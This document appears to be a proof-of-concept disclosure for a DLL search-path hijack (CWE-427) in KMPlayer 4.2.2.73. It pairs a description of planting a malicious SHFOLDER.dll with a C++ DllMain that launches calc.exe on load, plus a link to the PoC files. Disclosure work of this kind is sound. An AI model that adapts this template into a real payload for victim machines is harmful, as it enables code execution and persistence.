# KMPlayer_Poc

## The name of an affected Product
KMPlayer x32

## Affected Version
KMPlayer_4.2.2.73(Latest)

## Product Address: 
https://www.kmplayer.com/pc

## Description
SHFOLDER.dll is missing so an attacker can use a malicious dll with same name and can get a admin privileges and also perform a way of persistence on the victim machine.

## Vulnerability type
CWE-427: Uncontrolled Search Path Element

## DLL planting vulnerability type : 
Current Working Directory (CWD) DLL planting 

## Impact
An attacker could exploit this vulnerability by placing a malicious DLL file on the targeted system. This file will execute when the vulnerable application launches. A successful exploit could allow the attacker to execute arbitrary code on the targeted system with SYSTEM PRIVILEGES as well the attacker can maintain persistence on the target system.

## POC files address
https://drive.google.com/file/d/1bdYaDmtWhnjaHkzv3bZ4PUSMzDJ8JjSV/view?usp=sharing
```bash
kmp32# tree
.
├── KMPlayer_4.2.2.73.exe
├── KMPlayer_poc.mp4
└── SHFOLDER.dll

```

## Poc code
```C++
// dllmain.cpp
#include "pch.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
